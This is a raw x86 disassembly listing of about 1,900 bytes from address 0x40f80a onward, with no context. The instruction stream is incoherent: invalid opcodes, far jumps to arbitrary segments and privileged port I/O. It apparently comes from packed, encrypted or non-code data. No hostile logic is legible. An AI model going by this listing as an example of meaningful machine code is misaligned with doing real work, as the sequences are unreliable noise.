  40f80a:	repz jo 0x40f822
  40f80d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f80e:	and    dl,al
  40f810:	cmp    al,0x72
  40f812:	sbb    ebp,ebx
  40f814:	xor    ebp,edx
  40f816:	stos   DWORD PTR es:[edi],eax
  40f817:	mov    ebp,0xe4a5b25d
  40f81c:	aam    0x3d
  40f81e:	or     eax,0x18a7b0fd
  40f823:	mov    bl,0xa7
  40f825:	shl    BYTE PTR [edx-0x2d0f1aa9],cl
  40f82b:	sbb    BYTE PTR [ebx],bh
  40f82d:	test   cl,0x8e
  40f830:	rcl    DWORD PTR [ebx+0x211c9ce0],cl
  40f836:	pop    es
  40f837:	stos   DWORD PTR es:[edi],eax
  40f838:	jno    0x40f7ed
  40f83a:	outs   dx,DWORD PTR ds:[esi]
  40f83b:	jne    0x40f8b2
  40f83d:	push   esi
  40f83e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f83f:	inc    esi
  40f840:	cmp    al,0x67
  40f842:	addr16 int 0x9b
  40f845:	fsub   DWORD PTR ds:0x7bb52225
  40f84b:	xchg   ecx,eax
  40f84c:	mov    esi,0xf1cb96f0
  40f851:	xchg   ecx,eax
  40f852:	fisttp WORD PTR [esi-0x54da1f0]
  40f858:	inc    ebp
  40f859:	push   ebx
  40f85a:	call   0xa764264d
  40f85f:	push   esi
  40f860:	ror    BYTE PTR [edi],cl
  40f862:	sbb    al,bl
  40f864:	fcomp  st(2)
  40f866:	push   0xadfdff7d
  40f86b:	and    bl,BYTE PTR [ebx+0x4c8192bb]
  40f871:	jmp    0xae5a:0x82f4a15f
  40f878:	loop   0x40f82d
  40f87a:	jb     0x40f881
  40f87c:	jne    0x40f8a5
  40f87e:	stc    
  40f87f:	(bad)  
  40f880:	daa    
  40f881:	xor    ebp,eax
  40f883:	js     0x40f886
  40f885:	pop    ebp
  40f886:	inc    ebx
  40f887:	lea    esi,[ecx]
  40f889:	ds (bad) 
  40f88b:	scas   eax,DWORD PTR es:[edi]
  40f88c:	ss leave 
  40f88e:	(bad)  
  40f88f:	retf   
  40f890:	je     0x40f907
  40f892:	sub    DWORD PTR [ebx],0xffffff91
  40f895:	cld    
  40f896:	jns    0x40f88f
  40f898:	jnp    0x40f8c4
  40f89a:	test   BYTE PTR [eax],dh
  40f89c:	inc    ebp
  40f89d:	xlat   BYTE PTR ds:[ebx]
  40f89e:	jl     0x40f823
  40f8a0:	dec    esi
  40f8a1:	adc    DWORD PTR [edx+0x7e],0x79e3aec7
  40f8a8:	(bad)  
  40f8a9:	in     al,0x68
  40f8ab:	pop    eax
  40f8ac:	xor    eax,0xb7751695
  40f8b1:	push   esi
  40f8b2:	pop    esi
  40f8b3:	jmp    0x998:0xd08e9127
  40f8ba:	sub    BYTE PTR [edi-0x5f],bl
  40f8bd:	shl    dl,cl
  40f8bf:	call   0x55f5:0x6e4b8512
  40f8c6:	or     BYTE PTR [edi],cl
  40f8c8:	cmp    ch,ah
  40f8ca:	mov    ds:0xdadd1cd9,eax
  40f8cf:	mov    BYTE PTR [ebx+0x21],dh
  40f8d2:	nop
  40f8d3:	and    DWORD PTR [ecx-0x78641e93],edi
  40f8d9:	int3   
  40f8da:	cmp    DWORD PTR [eax-0x710741b0],esi
  40f8e0:	adc    BYTE PTR [ecx-0x51],ah
  40f8e3:	ret    
  40f8e4:	ret    0x6199
  40f8e7:	inc    esi
  40f8e8:	dec    eax
  40f8e9:	mov    edx,0xce5bfadb
  40f8ee:	sub    ah,BYTE PTR [ebx-0x75f0ddf4]
  40f8f4:	inc    edx
  40f8f5:	dec    ebx
  40f8f6:	lods   al,BYTE PTR ds:[esi]
  40f8f7:	pop    ebp
  40f8f8:	sbb    DWORD PTR [eax],esp
  40f8fa:	ds xchg esp,eax
  40f8fc:	daa    
  40f8fd:	xor    BYTE PTR [edx+0x266b6323],dl
  40f903:	mov    ecx,0xbe49293d
  40f908:	pop    ebp
  40f909:	jl     0x40f8b2
  40f90b:	jns    0x40f8eb
  40f90d:	adc    eax,0x5926f302
  40f912:	mov    bl,0x22
  40f914:	dec    ebx
  40f915:	or     dh,BYTE PTR [ecx]
  40f917:	push   0x52
  40f919:	jmp    0x40f947
  40f91b:	sub    edi,ebp
  40f91d:	jbe    0x40f8cd
  40f91f:	popa   
  40f920:	mov    al,ds:0xcc9a1d2
  40f925:	lea    esi,[ebx+edx*1+0x44825ad]
  40f92c:	loopne 0x40f8fb
  40f92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f92f:	cmovne ebp,DWORD PTR [ebx]
  40f932:	in     eax,0x77
  40f934:	scas   al,BYTE PTR es:[edi]
  40f935:	dec    ecx
  40f936:	and    al,0xdf
  40f938:	inc    esp
  40f939:	add    DWORD PTR [ebx+0x196ccb55],0x5c6ad7b8
  40f943:	xor    eax,0xcb57f5b4
  40f948:	sbb    al,0x4f
  40f94a:	xchg   ebx,eax
  40f94b:	test   eax,0x8dc9d16b
  40f950:	push   ss
  40f951:	daa    
  40f952:	fmulp  st(5),st
  40f954:	mov    edx,DWORD PTR [edx]
  40f956:	lods   eax,DWORD PTR ds:[esi]
  40f957:	adc    dl,BYTE PTR [esp+ebp*4-0x5a]
  40f95b:	cmp    al,0xe3
  40f95d:	xor    DWORD PTR [esi+0x38e7c534],esi
  40f963:	cmp    BYTE PTR [ebx+edx*8],0x85
  40f967:	loop   0x40f9a2
  40f969:	pop    ebx
  40f96a:	jmp    0xe261:0xa89abcab
  40f971:	hlt    
  40f972:	ret    
  40f973:	sbb    cl,BYTE PTR [eax-0x55]
  40f976:	gs shr al,cl
  40f979:	popa   
  40f97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f97b:	mov    al,ds:0x8790161a
  40f980:	mov    al,ds:0x1ce92610
  40f985:	xor    BYTE PTR [esi+0x19],ah
  40f988:	xlat   BYTE PTR ds:[ebx]
  40f989:	out    0xce,eax
  40f98b:	push   eax
  40f98c:	(bad)  
  40f98d:	iret   
  40f98e:	pop    ss
  40f98f:	leave  
  40f990:	icebp  
  40f991:	es retf 
  40f993:	adc    ebp,esi
  40f995:	mov    edx,0x935aa69
  40f99a:	or     al,0x92
  40f99c:	jns    0x40fa12
  40f99e:	or     ch,BYTE PTR cs:[eax+0x10065c22]
  40f9a5:	sbb    edi,DWORD PTR [esi]
  40f9a7:	inc    ebp
  40f9a8:	pop    esi
  40f9a9:	daa    
  40f9aa:	pop    ss
  40f9ab:	or     eax,0x26fc8afc
  40f9b0:	outs   dx,DWORD PTR ds:[esi]
  40f9b1:	test   DWORD PTR [ebp-0x4d478d40],ebp
  40f9b7:	aas    
  40f9b8:	push   0xed04424c
  40f9bd:	and    eax,0x602347c3
  40f9c2:	cdq    
  40f9c3:	mov    cl,BYTE PTR [edx+edx*2+0x22]
  40f9c7:	rol    DWORD PTR [ecx],0x66
  40f9ca:	cmp    bh,BYTE PTR [eax-0xd]
  40f9cd:	lods   al,BYTE PTR ds:[esi]
  40f9ce:	call   0x245dc098
  40f9d3:	aas    
  40f9d4:	rcl    BYTE PTR [edx-0x7fc774d6],cl
  40f9da:	cld    
  40f9db:	xchg   ecx,eax
  40f9dc:	mov    eax,ds:0x53323bc0
  40f9e1:	or     DWORD PTR [edi],ecx
  40f9e3:	bound  edx,QWORD PTR [ebx+ecx*1]
  40f9e6:	pop    esi
  40f9e7:	cs push ecx
  40f9e9:	pop    ebp
  40f9ea:	adc    BYTE PTR [ecx+eiz*8-0x3d086923],ch
  40f9f1:	rcr    BYTE PTR [edi],1
  40f9f3:	xlat   BYTE PTR ds:[ebx]
  40f9f4:	bound  esp,QWORD PTR [eax+0x44]
  40f9f7:	outs   dx,BYTE PTR ds:[esi]
  40f9f8:	out    dx,eax
  40f9f9:	popa   
  40f9fa:	pushf  
  40f9fb:	ret    
  40f9fc:	imul   ebp,DWORD PTR [ecx],0xac6f93f2
  40fa02:	add    al,0xc8
  40fa04:	jbe    0x40fa1c
  40fa06:	loope  0x40f9df
  40fa08:	mov    DWORD PTR [edx],edi
  40fa0a:	pop    ebp
  40fa0b:	inc    edi
  40fa0c:	out    dx,al
  40fa0d:	enter  0x3481,0x4a
  40fa11:	aad    0x27
  40fa13:	rcr    BYTE PTR [edx+0x7e],cl
  40fa16:	mov    esp,ebp
  40fa18:	jae    0x40f99e
  40fa1a:	iret   
  40fa1b:	jecxz  0x40f9cb
  40fa1d:	sub    bh,BYTE PTR [ecx*8+0x4638b063]
  40fa24:	xchg   edx,eax
  40fa25:	addr16 jns 0x40faa3
  40fa28:	(bad)  
  40fa29:	mov    WORD PTR [ebp+0x57],?
  40fa2c:	push   ebp
  40fa2d:	push   ebp
  40fa2e:	stos   BYTE PTR es:[edi],al
  40fa2f:	mov    ch,0x3b
  40fa31:	jmp    0x2972:0xf7c6536
  40fa38:	xor    bl,bh
  40fa3a:	enter  0xbec5,0x71
  40fa3e:	adc    DWORD PTR [edi],0xffffffa9
  40fa41:	push   ecx
  40fa42:	lods   al,BYTE PTR ds:[esi]
  40fa43:	jb     0x40fa27
  40fa45:	shl    ebp,1
  40fa47:	adc    DWORD PTR ds:[eax-0x3c],edx
  40fa4b:	popa   
  40fa4c:	or     DWORD PTR [edx-0x5b],eax
  40fa4f:	add    bh,BYTE PTR es:[esp+eax*2]
  40fa53:	mov    dl,BYTE PTR [edi]
  40fa55:	lods   eax,DWORD PTR ds:[esi]
  40fa56:	scas   eax,DWORD PTR es:[edi]
  40fa57:	stos   DWORD PTR es:[edi],eax
  40fa58:	rcr    BYTE PTR [edx+0x5d7fa6d8],cl
  40fa5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa5f:	cmp    ebp,DWORD PTR [edx]
  40fa61:	jl     0x40fab9
  40fa63:	dec    esi
  40fa64:	jne    0x40facb
  40fa66:	mov    BYTE PTR [eax+0xf],dl
  40fa69:	mov    ebx,0x313be819
  40fa6e:	adc    eax,0x8e8d0122
  40fa73:	jo     0x40f9f5
  40fa75:	cmp    BYTE PTR ds:0x984699a8,0xde
  40fa7c:	add    eax,0x733a9f13
  40fa81:	sbb    ch,BYTE PTR [ebx+0x38]
  40fa84:	icebp  
  40fa85:	pusha  
  40fa86:	cmp    BYTE PTR [edx],al
  40fa88:	lea    eax,[ecx]
  40fa8a:	or     al,0xbc
  40fa8c:	psllq  mm5,mm2
  40fa8f:	push   0xcc8a0bd3
  40fa94:	out    0xee,eax
  40fa96:	out    dx,eax
  40fa97:	outs   dx,BYTE PTR ds:[esi]
  40fa98:	mov    ds:0xf2f6ea12,al
  40fa9d:	xchg   edx,eax
  40fa9e:	inc    esp
  40fa9f:	repnz sbb ecx,DWORD PTR [edi+0x28bc7861]
  40faa6:	inc    edx
  40faa7:	xor    ecx,DWORD PTR [esi-0x1c]
  40faaa:	imul   BYTE PTR [edx]
  40faac:	sar    BYTE PTR [edx],cl
  40faae:	xchg   esp,eax
  40faaf:	mov    bh,0x4b
  40fab1:	test   DWORD PTR [ecx-0x6205443d],0xe7377d6b
  40fabb:	scas   al,BYTE PTR es:[edi]
  40fabc:	xchg   esi,eax
  40fabd:	sti    
  40fabe:	or     edi,ecx
  40fac0:	jae    0x40fad9
  40fac2:	(bad)  
  40fac3:	xor    eax,0x1735daa
  40fac8:	sub    DWORD PTR [eax-0x19],ecx
  40facb:	or     BYTE PTR [ecx-0x4d],0xd7
  40facf:	xlat   BYTE PTR ds:[ebx]
  40fad0:	int    0xe5
  40fad2:	pushf  
  40fad3:	in     al,0xf4
  40fad5:	cs inc edx
  40fad7:	test   DWORD PTR [edi+0x536c1058],edi
  40fadd:	adc    eax,0x85b10c28
  40fae2:	mov    ah,0x27
  40fae4:	dec    ecx
  40fae5:	int3   
  40fae6:	xor    BYTE PTR [edi+0x5036da81],al
  40faec:	nop
  40faed:	adc    ebx,ebx
  40faef:	pushf  
  40faf0:	adc    DWORD PTR [edx-0x69],0x647a4be4
  40faf7:	pusha  
  40faf8:	inc    ebp
  40faf9:	or     esi,DWORD PTR [edi-0x5e]
  40fafc:	lahf   
  40fafd:	and    ah,BYTE PTR [ebx-0x31]
  40fb00:	sub    DWORD PTR [edx],ebp
  40fb02:	fild   QWORD PTR [edx*8-0x3ea57877]
  40fb09:	sar    DWORD PTR [ecx+ebp*8+0x50],0x6a
  40fb0e:	out    0xeb,eax
  40fb10:	out    0x64,al
  40fb12:	out    dx,al
  40fb13:	mov    eax,ebx
  40fb15:	jnp    0x40faea
  40fb17:	rcl    dl,0xd6
  40fb1a:	call   0x602e0a1a
  40fb1f:	pop    edx
  40fb20:	mov    WORD PTR [ebx-0x644e1e01],?
  40fb26:	sub    BYTE PTR [esi+0x51],bh
  40fb29:	cmp    DWORD PTR [eax+ebx*2-0x52],ebp
  40fb2d:	cmp    BYTE PTR [edi+0x17],cl
  40fb30:	mov    edx,0xa184fea7
  40fb35:	xchg   ebp,eax
  40fb36:	aaa    
  40fb37:	or     esi,ebx
  40fb39:	invd   
  40fb3b:	ins    BYTE PTR es:[edi],dx
  40fb3c:	xlat   BYTE PTR ds:[ebx]
  40fb3d:	les    edi,FWORD PTR [ebx-0x3b71d9bf]
  40fb43:	mov    esp,0xe510711d
  40fb48:	jg     0x40fb1b
  40fb4a:	das    
  40fb4b:	aam    0xba
  40fb4d:	cmp    ah,dh
  40fb4f:	adc    al,0x99
  40fb51:	sahf   
  40fb52:	and    ah,ah
  40fb54:	jb     0x40fb47
  40fb56:	pop    eax
  40fb57:	cmc    
  40fb58:	dec    eax
  40fb59:	aam    0x93
  40fb5b:	jp     0x40fb1d
  40fb5d:	je     0x40fbbc
  40fb5f:	ins    DWORD PTR es:[edi],dx
  40fb60:	ret    0x62dc
  40fb63:	add    esp,DWORD PTR [edi+0x44]
  40fb66:	jae    0x40fb00
  40fb68:	add    esi,eax
  40fb6a:	mov    ch,0x4a
  40fb6c:	push   edi
  40fb6d:	adc    DWORD PTR [edx-0x6a],esi
  40fb70:	cli    
  40fb71:	adc    DWORD PTR fs:[ecx+ebp*8-0x13],esi
  40fb76:	imul   eax,DWORD PTR [esi],0xffffffce
  40fb79:	ficom  DWORD PTR [esi+0xa]
  40fb7c:	sahf   
  40fb7d:	cs retf 0x34a
  40fb81:	ins    BYTE PTR es:[edi],dx
  40fb82:	dec    eax
  40fb83:	pusha  
  40fb84:	ja     0x40fb7b
  40fb86:	pop    ds
  40fb87:	ja     0x40fc00
  40fb89:	mov    BYTE PTR [edi-0x5b8a72a4],cl
  40fb8f:	dec    ebp
  40fb90:	dec    esp
  40fb91:	xchg   esp,eax
  40fb92:	loope  0x40fb93
  40fb94:	or     DWORD PTR [esi],esi
  40fb96:	pop    ecx
  40fb98:	jmp    0x206b:0x6b8e5787
  40fb9f:	js     0x40fb4a
  40fba1:	pop    ecx
  40fba2:	mov    ch,0xd4
  40fba4:	jb     0x40fba7
  40fba6:	in     eax,dx
  40fba7:	test   eax,0xf08a90e3
  40fbac:	jp     0x40fb8c
  40fbae:	push   eax
  40fbaf:	loope  0x40fc11
  40fbb1:	xor    DWORD PTR [ecx+0x78d6e04f],esi
  40fbb7:	std    
  40fbb8:	adc    DWORD PTR [ebx+0x74],eax
  40fbbb:	mov    edx,0x4fd95898
  40fbc0:	add    eax,0x30864cd3
  40fbc5:	cmp    BYTE PTR [ebx+0x6e],0xeb
  40fbc9:	out    dx,eax
  40fbca:	add    DWORD PTR [edi],ecx
  40fbcc:	lods   al,BYTE PTR ds:[esi]
  40fbcd:	lds    esp,FWORD PTR [ebx-0x13]
  40fbd0:	ss ret 0x4441
  40fbd4:	push   eax
  40fbd5:	in     eax,0xb8
  40fbd7:	push   ss
  40fbd8:	mov    ds:0xb6b23dd2,al
  40fbdd:	pop    edi
  40fbde:	cmp    eax,0xd757cf27
  40fbe3:	(bad)
  40fbe7:	sbb    BYTE PTR [edx+0x7ba6bb8a],ah
  40fbed:	mov    ss,WORD PTR [ebx+0x2e]
  40fbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf1:	ror    BYTE PTR [eax-0x91c900f],1
  40fbf7:	fimul  DWORD PTR [ecx]
  40fbf9:	push   0xffffffdf
  40fbfb:	dec    esi
  40fbfc:	mov    esi,0xe3e84950
  40fc01:	mov    eax,ds:0x3a3ce4c1
  40fc06:	mov    ds:0xe34b5c74,eax
  40fc0b:	inc    BYTE PTR [edx-0x6d68f6d9]
  40fc11:	xor    dh,BYTE PTR [edi-0x47148d97]
  40fc17:	jle    0x40fc5b
  40fc19:	scas   al,BYTE PTR es:[edi]
  40fc1a:	loope  0x40fbd1
  40fc1c:	imul   ecx,DWORD PTR [ebx-0x3],0xab7484e2
  40fc23:	stos   DWORD PTR es:[edi],eax
  40fc24:	sub    al,dl
  40fc26:	neg    ebp
  40fc28:	cwde   
  40fc29:	add    edi,edi
  40fc2b:	pop    esi
  40fc2c:	lock xchg ebx,eax
  40fc2e:	mov    esi,0x103d0460
  40fc33:	(bad)  
  40fc34:	fs sub al,0x86
  40fc37:	loope  0x40fc1c
  40fc39:	sti    
  40fc3a:	sub    eax,0xdca17e51
  40fc3f:	jbe    0x40fc88
  40fc41:	mov    ebp,gs
  40fc43:	mov    ch,0xdb
  40fc45:	mov    ebx,DWORD PTR [edi-0x1c51fbb7]
  40fc4b:	add    eax,0xe783e19c
  40fc50:	shl    BYTE PTR [eax+0x4d2f982a],0x89
  40fc57:	lahf   
  40fc58:	cmc    
  40fc59:	adc    bl,BYTE PTR [edi+0x4a]
  40fc5c:	and    DWORD PTR [ecx+0x7187c234],edi
  40fc62:	sub    DWORD PTR [eax-0x74],edi
  40fc65:	sub    bh,dh
  40fc67:	inc    ecx
  40fc68:	add    eax,0x16aee04b
  40fc6d:	dec    esp
  40fc6e:	in     eax,0x92
  40fc70:	cld    
  40fc71:	clc    
  40fc72:	loopne 0x40fc46
  40fc74:	daa    
  40fc75:	sahf   
  40fc76:	cs retf 0x1adb
  40fc7a:	idiv   DWORD PTR ds:0x6bac1116
  40fc80:	loope  0x40fcea
  40fc82:	sbb    DWORD PTR [esi-0x64],eax
  40fc85:	sub    edx,DWORD PTR [ebx]
  40fc87:	push   edx
  40fc88:	stc    
  40fc89:	mov    al,0x15
  40fc8b:	clc    
  40fc8c:	push   ebp
  40fc8d:	dec    edi
  40fc8e:	out    dx,al
  40fc8f:	and    eax,0x81012c7a
  40fc94:	pop    edi
  40fc95:	push   ds
  40fc96:	push   0xde7f677b
  40fc9b:	cs leave 
  40fc9d:	and    BYTE PTR [edx-0x69cf5bc0],dh
  40fca3:	xor    DWORD PTR [eax+esi*1],esi
  40fca6:	inc    ebx
  40fca7:	sbb    ebx,DWORD PTR [esi-0x214c1c92]
  40fcad:	sbb    cl,BYTE PTR [ebx]
  40fcaf:	xor    DWORD PTR [ebx+esi*1-0x1d0a3d3b],0xffffffac
  40fcb7:	xor    bl,BYTE PTR [ebp-0x5173e6c7]
  40fcbd:	xchg   edi,eax
  40fcbe:	mov    al,0xa7
  40fcc0:	fimul  DWORD PTR [ebx+0x4ff63074]
  40fcc6:	cld    
  40fcc7:	mov    ds:0x5b0390b8,eax
  40fccc:	inc    esp
  40fccd:	fst    QWORD PTR [ecx-0x1188cca0]
  40fcd3:	int3   
  40fcd4:	adc    BYTE PTR [ecx+0x5b],dl
  40fcd7:	sbb    edx,DWORD PTR [ecx+esi*2-0x1b]
  40fcdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcdc:	out    dx,al
  40fcdd:	or     eax,0xf15611fe
  40fce2:	call   0x7ab3:0xf7b58129
  40fce9:	jnp    0x40fc83
  40fceb:	call   0xafaeeffd
  40fcf0:	push   cs
  40fcf1:	ds jmp 0x7d6f:0x1575759c
  40fcf9:	cwde   
  40fcfa:	(bad)  
  40fcfc:	iret   
  40fcfd:	in     eax,0xc0
  40fcff:	cmp    al,0x8e
  40fd01:	call   0xf4a0:0x14d519cf
  40fd08:	(bad)  es:[esi]
  40fd0b:	adc    BYTE PTR [esi],dh
  40fd0d:	push   0x35a6e52f
  40fd12:	jmp    0x1513152b
  40fd17:	dec    eax
  40fd18:	adc    dl,BYTE PTR [edx-0x2a]
  40fd1b:	and    DWORD PTR [ebx+eiz*1],esp
  40fd1e:	inc    edi
  40fd1f:	adc    BYTE PTR [eax],cl
  40fd21:	arpl   WORD PTR [ebx-0x294a16c],ax
  40fd27:	fnstsw WORD PTR [eax+ebp*8+0x69]
  40fd2b:	ret    0xf326
  40fd2e:	mov    ecx,0xbafbf995
  40fd33:	xor    DWORD PTR [edi-0x18d7cc37],edi
  40fd39:	xor    esp,edx
  40fd3b:	jns    0x40fd73
  40fd3d:	stc    
  40fd3e:	popf   
  40fd3f:	cwde   
  40fd40:	aas    
  40fd41:	mov    dh,0x5b
  40fd43:	mov    esi,0x1cfb9e16
  40fd48:	add    BYTE PTR [ecx-0x7819a90a],ch
  40fd4e:	dec    edi
  40fd4f:	or     BYTE PTR ds:0xe62a4756,0x73
  40fd56:	pop    DWORD PTR [eax-0x3d1b585a]
  40fd5c:	rcr    DWORD PTR [edx+ebx*8],0x1a
  40fd60:	(bad)  
  40fd61:	inc    esp
  40fd62:	add    DWORD PTR [edx+eax*1+0x21],eax
  40fd66:	mov    esi,0xd396e2f6
  40fd6b:	adc    BYTE PTR [esi+0x59],cl
  40fd6e:	xor    ah,BYTE PTR [edi-0x24]
  40fd71:	or     ecx,ebp
  40fd73:	test   eax,0xf7dac580
  40fd78:	mov    edi,esi
  40fd7a:	push   es
  40fd7b:	test   al,0xbe
  40fd7d:	lock fwait
  40fd7f:	sar    BYTE PTR [eax+0x29],0x6d
  40fd83:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd85:	lock add al,0xc3
  40fd88:	fsub   DWORD PTR [ecx-0x35]
  40fd8b:	aad    0xd4
  40fd8d:	jge    0x40fdbe
  40fd8f:	popf   
  40fd90:	loopne 0x40fd7a
  40fd92:	inc    edi
  40fd93:	(bad)  
  40fd94:	in     eax,0x9c
  40fd96:	jne    0x40fdba
  40fd98:	xchg   bh,dh
  40fd9a:	pushf  
  40fd9b:	iret   
  40fd9c:	and    ebx,eax
  40fd9e:	sub    DWORD PTR [esi-0x6469a8a3],esi
  40fda4:	mov    al,0x1d
  40fda6:	push   0xc21c8c9c
  40fdab:	push   ebx
  40fdac:	cdq    
  40fdad:	rcr    BYTE PTR [edi],1
  40fdaf:	ror    BYTE PTR [esi-0x10],cl
  40fdb2:	cmp    al,0xc0
  40fdb4:	(bad)  
  40fdb5:	loop   0x40fe20
  40fdb7:	int3   
  40fdb8:	out    0xc3,eax
  40fdba:	mov    esi,0x44ed3f9e
  40fdbf:	imul   DWORD PTR [ebp+0x50]
  40fdc2:	sahf   
  40fdc3:	aas    
  40fdc4:	test   al,0xaf
  40fdc6:	ss push 0xffffffda
  40fdc9:	retf   0xe824
  40fdcc:	stos   WORD PTR es:[edi],ax
  40fdce:	bound  edi,QWORD PTR [eax+0x61813efe]
  40fdd4:	outs   dx,DWORD PTR ds:[esi]
  40fdd5:	mov    ah,0x15
  40fdd7:	imul   esp,DWORD PTR [ecx+0x44],0xffffff98
  40fddb:	adc    bl,BYTE PTR [ebx]
  40fddd:	mov    dh,0x36
  40fddf:	jnp    0x40fe0b
  40fde1:	das    
  40fde2:	cmp    dh,BYTE PTR [ebx-0x12]
  40fde5:	mov    bh,0xf3
  40fde7:	xor    al,0x98
  40fde9:	jne    0x40fe41
  40fdeb:	sbb    ebx,ecx
  40fded:	scas   al,BYTE PTR es:[edi]
  40fdee:	jmp    0xe848940
  40fdf3:	jmp    0xfcb1:0xbd104b5
  40fdfa:	aas    
  40fdfb:	dec    edi
  40fdfc:	mov    al,ds:0x79037d93
  40fe01:	js     0x40fe7e
  40fe03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe04:	outs   dx,BYTE PTR ds:[esi]
  40fe05:	mov    dl,0x3c
  40fe08:	fcmovbe st,st(0)
  40fe0a:	jl     0x40fda8
  40fe0c:	sbb    DWORD PTR [ebx],ecx
  40fe0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe0f:	dec    ecx
  40fe10:	mov    al,0x76
  40fe12:	fisub  DWORD PTR [ecx-0x20060716]
  40fe18:	ret    0xfd30
  40fe1b:	cld    
  40fe1c:	sbb    DWORD PTR [esi+0x1475d112],esi
  40fe22:	scas   eax,DWORD PTR es:[edi]
  40fe23:	adc    DWORD PTR [edx+0x60],esp
  40fe26:	sbb    cl,0x8c
  40fe29:	add    al,0xea
  40fe2b:	fistp  QWORD PTR [esp+edx*1+0x7c]
  40fe2f:	add    eax,ebp
  40fe31:	shr    BYTE PTR [edi+0x289f12a],0x58
  40fe38:	leave  
  40fe39:	(bad)  
  40fe3a:	sub    DWORD PTR [esi+0x580b8298],ecx
  40fe40:	xor    al,0x1b
  40fe42:	call   0xf23b:0x77b9614b
  40fe49:	push   edx
  40fe4a:	xor    edx,esp
  40fe4c:	ja     0x40fe95
  40fe4e:	mov    al,bl
  40fe50:	mov    ds:0xc8241eba,eax
  40fe55:	fst    QWORD PTR [eax-0x62a71dd0]
  40fe5b:	or     ebx,DWORD PTR [edx-0x2d]
  40fe5e:	cli    
  40fe5f:	dec    edi
  40fe60:	cmp    dh,ah
  40fe62:	lahf   
  40fe63:	mov    eax,0xf6d11d3b
  40fe68:	mov    DWORD PTR [ebx-0x5d7d9db1],0xce94b666
  40fe72:	or     DWORD PTR [edi],0x43
  40fe75:	xchg   edi,eax
  40fe76:	inc    ebx
  40fe77:	nop
  40fe78:	outs   dx,BYTE PTR ds:[esi]
  40fe79:	aam    0x2c
  40fe7b:	cmp    BYTE PTR [esi+edx*4],0x2d
  40fe7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe80:	call   0x1acffd6d
  40fe85:	ins    BYTE PTR es:[edi],dx
  40fe86:	adc    ebp,DWORD PTR [esi-0x50adee0]
  40fe8c:	xor    DWORD PTR [eax+0x72],edi
  40fe8f:	ins    BYTE PTR es:[edi],dx
  40fe90:	ficomp WORD PTR ds:0x2dc63d55
  40fe96:	inc    ebp
  40fe97:	retf   0x8288
  40fe9a:	push   edx
  40fe9b:	cmp    ecx,DWORD PTR [ecx-0x67]
  40fe9e:	dec    esi
  40fe9f:	dec    eax
  40fea0:	sbb    al,0x52
  40fea2:	cmp    al,0x8f
  40fea4:	gs inc ebx
  40fea6:	and    ecx,ebx
  40fea8:	fcomp  DWORD PTR gs:[edi]
  40feab:	aas    
  40feac:	cmp    al,ch
  40feae:	push   ds
  40feaf:	adc    esi,DWORD PTR [ecx+0x60]
  40feb2:	imul   ebp,DWORD PTR [esp+eax*2-0xa],0xffffffb2
  40feb7:	pop    ecx
  40feb8:	jge    0x40ff1c
  40feba:	adc    BYTE PTR [ebx+0x252af1f7],cl
  40fec0:	push   ebx
  40fec1:	sub    eax,0x90344e59
  40fec6:	or     esi,DWORD PTR [edi-0x6d1fa84f]
  40fecc:	or     al,ch
  40fece:	pop    ss
  40fecf:	rol    edx,cl
  40fed1:	not    ah
  40fed3:	push   edx
  40fed4:	fnstenv [esi+0x3]
  40fed7:	xchg   edi,eax
  40fed8:	loop   0x40fef9
  40feda:	lahf   
  40fedb:	cmp    ah,BYTE PTR [ebp-0x33]
  40fede:	push   edx
  40fedf:	push   cs
  40fee0:	and    al,0x49
  40fee2:	mov    dl,0xa0
  40fee4:	xchg   esi,eax
  40fee5:	xor    ebx,DWORD PTR [esi-0x29]
  40fee8:	lods   al,BYTE PTR ds:[esi]
  40fee9:	ds fcmovnu st,st(7)
  40feec:	aas    
  40feed:	inc    ebp
  40feee:	fidiv  DWORD PTR [eax]
  40fef0:	xchg   esp,eax
  40fef1:	sbb    bl,dh
  40fef3:	xchg   ebx,eax
  40fef4:	sub    al,0x82
  40fef6:	dec    esp
  40fef7:	icebp  
  40fef8:	xor    BYTE PTR [edx-0x7a],al
  40fefb:	and    BYTE PTR [eax],bl
  40fefd:	xor    al,BYTE PTR fs:[eax]
  40ff00:	fdecstp 
  40ff02:	(bad)  [edi+0x20]
  40ff05:	jmp    0xf668:0x9dcdf10a
  40ff0c:	aam    0x20
  40ff0e:	inc    esp
  40ff0f:	fwait
  40ff10:	sar    BYTE PTR [esi],0x8a
  40ff13:	xchg   edi,eax
  40ff14:	repnz cmp BYTE PTR [ebp+0x72],ah
  40ff18:	bound  eax,QWORD PTR [esi+0x4b41a2fd]
  40ff1e:	cdq    
  40ff1f:	inc    esp
  40ff20:	sub    DWORD PTR [ebp+0x7d],esi
  40ff23:	leave  
  40ff24:	imul   edx,DWORD PTR [eax],0x826fbffb
  40ff2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff2b:	or     DWORD PTR [ebx],esi
  40ff2d:	or     al,0xc3
  40ff2f:	fcomp  QWORD PTR [esi+eax*4-0x4b]
  40ff33:	pushf  
  40ff34:	jne    0x40ffa1
  40ff36:	jnp    0x40ff0f
  40ff38:	repnz std 
  40ff3a:	cmp    eax,0xce066e7
  40ff3f:	dec    edi
  40ff40:	lock ret 
  40ff42:	adc    DWORD PTR [ecx],0x9ce42ae2
  40ff48:	and    cl,bh
  40ff4a:	xor    eax,DWORD PTR [esi-0x2b]
  40ff4d:	popf   
  40ff4e:	ins    BYTE PTR es:[edi],dx
  40ff4f:	push   ecx
  40ff50:	out    dx,al
  40ff51:	not    ah
  40ff53:	ins    BYTE PTR es:[edi],dx
  40ff54:	aaa    
  40ff55:	sub    dh,bh
  40ff57:	iret   
  40ff58:	mov    ds,WORD PTR [eax+0x1c]
  40ff5b:	jnp    0x40ff13
  40ff5d:	cdq    
  40ff5e:	int3   
